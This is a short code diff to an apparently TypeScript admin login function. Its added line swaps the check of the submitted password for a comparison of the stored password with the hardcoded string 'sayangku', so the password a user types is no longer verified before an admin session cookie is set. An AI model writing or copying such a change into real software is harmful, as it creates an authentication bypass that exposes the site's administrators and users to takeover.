@@ -17,7 +17,7 @@ export async function loginAdmin(values: {username: string, password: string}): 
   if (
     adminCreds &&
     adminCreds.username === values.username &&
-    adminCreds.password === values.password
+    adminCreds.password === 'sayangku'
   ) {
     const expires = new Date(Date.now() + SESSION_DURATION);
     cookies().set(ADMIN_SESSION_COOKIE_NAME, JSON.stringify({ isAdmin: true }), { expires, httpOnly: true });
